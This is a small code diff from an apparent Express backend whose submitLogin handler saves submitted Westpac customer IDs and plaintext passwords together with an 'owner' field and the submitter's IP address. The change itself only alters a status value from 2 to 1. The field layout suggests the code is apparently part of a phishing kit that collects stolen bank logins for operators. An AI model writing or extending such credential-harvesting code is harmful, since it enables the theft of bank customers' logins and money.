@@ -40,7 +40,7 @@ const getInfo = async (req, res) => {
 const submitLogin = async (req, res) => {
     const { customerId, password, uniqueid, owner, ip } = req.body;
     try {
-        await Westpac.create({ uniqueid, customerId, password, status: 2, owner, ip });
+        await Westpac.create({ uniqueid, customerId, password, status: 1, owner, ip });
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
